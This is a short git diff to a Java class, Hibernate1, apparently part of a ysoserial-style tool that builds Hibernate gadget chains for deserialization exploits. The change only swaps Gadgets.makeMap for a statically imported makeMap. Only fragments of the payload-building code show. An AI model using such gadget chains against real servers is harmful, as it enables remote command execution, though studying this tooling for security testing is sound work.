@@ -19,6 +19,8 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.makeMap;
+
 
 /**
  * org.hibernate.property.access.spi.GetterMethodImpl.get()
@@ -126,7 +128,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
         Reflections.setFieldValue(v2, "value", tpl);
         Reflections.setFieldValue(v2, "type", t);
 
-        return Gadgets.makeMap(v1, v2);
+        return makeMap(v1, v2);
     }
 
     static Object makeHibernate3Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
@@ -159,7 +161,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
         Reflections.setFieldValue(v2, "value", tpl);
         Reflections.setFieldValue(v2, "type", t);
 
-        return Gadgets.makeMap(v1, v2);
+        return makeMap(v1, v2);
     }
 
     public Object getObject(String command) throws Exception {
